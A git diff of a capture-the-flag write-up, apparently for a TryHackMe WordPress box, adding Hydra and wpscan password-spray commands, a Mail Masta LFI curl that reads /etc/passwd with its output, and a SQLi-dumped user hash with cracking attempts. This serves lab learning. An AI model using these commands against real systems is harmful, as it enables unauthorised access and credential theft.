@@ -215,7 +215,11 @@ msf auxiliary(wordpress_login_enum) > exploit
 ### Apache 2.4.29
 * No public exploits on Exploit db.
 ### WordPress
-* Use "wpscan" to identify vulnerabilites.
+* [wp-config.php](https://developer.wordpress.org/apis/wp-config-php/)
+> One of the most important files in your WordPress installation is the wp-config.php file. This file is located in the root of your WordPress file directory and contains your website’s base configuration details, such as database connection information.
+* [How to configure an Apache web server](https://opensource.com/article/18/2/apache-web-server-configuration).
+> The DocumentRoot directive specifies the location of the HTML files that make up the pages of the website. That line does not need to be changed because it already points to the standard location. The line should look like this: DocumentRoot "/var/www/html"
+* Use "wpscan" to identify WordPress vulnerabilites.
 ```
 wpscan --update
 wpscan --url http://TARGET_IP/Wordpress > wpscan.txt
@@ -235,20 +239,27 @@ wpscan --url http://TARGET_IP/Wordpress > wpscan.txt
   * No public exploits listed on Exploit db.
 ## Exploitation
 ### Initial Access
+#### Password spray SSH using Hydra.
+```
+hydra -l elyana -P /usr/share/wordlists/passwords/rockyou.txt TARGET_IP -t 4 ssh -vV
+```
+  * THM target host timed out before completion.
 #### Password spray WordPress using Hydra.
 ```
 hydra -l elyana -P /usr/share/wordlists/rockyou.txt TARGET_IP http-post-form "/wordpress/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2FTARGET_IP%2Fwordpress%2Fwp-admin%2F&testcookie=1:Error" -T 64 -vV
 ```
+  * Aborted as too slow - max 4 parallel threads.
 #### Password spray WordPress using WPscan.
 ```
-# sudo wpscan --password-attack xmlrpc -t 20 -U <username> -P /usr/share/wordlists/rockyou.txt --url <url>
-sudo wpscan --password-attack xmlrpc -t 20 -U elyana  -P /usr/share/wordlists/rockyou.txt --url http://TARGET_IP/wordpress/
+sudo wpscan --password-attack xmlrpc -t 20 -U elyana -P /usr/share/wordlists/rockyou.txt --url http://TARGET_IP/wordpress/
 ```
+  * THM target host timed out before completion.
 #### Exploit Mail Masta LFI vulnerability.
 > "pl" parameter allows inclusion of a file without any type of input validation or sanitisation. Can attempt to include arbitrary files on the webserver. E.g. display contents of /etc/passwd file using cURL.
 ```
 curl -s http://TARGET_IP/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
 ```
+  * `-s` 
 ```
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
@@ -284,6 +295,7 @@ sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
 ftp:x:111:115:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
 ```
 * Elyana user is only other user other than root with "/bin/bash" shell access.
+* Could not access other log files such as "/var/log/apache2/access.log" (accessed requests for Apache web server).
 #### Exploit Mail Masta SQLi.
 * Page `./wp-content/plugins/mail-masta/inc/lists/csvexport.php` (Unauthenticated).
 * GET parameter:`list_id`.
@@ -364,5 +376,10 @@ Table: wp_users
 | 1  | http://192.168.8.110/wordpress | $P$BhwVLVLk5fGRPyoEfmBfVs82bY7fSq1 | elyana     | none@none.com | 0           | elyana       | elyana        | 2020-10-05 19:55:50 | <blank>             |
 +----+--------------------------------+------------------------------------+------------+---------------+-------------+--------------+---------------+---------------------+---------------------+
 ```
-
+* Elyana is only user on target host.
+#### Attempt to crack "user_pass" hash.
+* [CyberChef](https://gchq.github.io/CyberChef/#recipe=Analyse_hash()&input=JFAkQmh3VkxWTGs1ZkdSUHlvRWZtQmZWczgyYlk3ZlNxMQ) reports that hash is invalid when analysed.
+* [hashes.com](https://hashes.com/en/decrypt/hash) could not find a match.
+* [crackstation.net](https://crackstation.net/) returned an "unrecognized hash format".
+* hashcat?
 ## Privilege Escalation
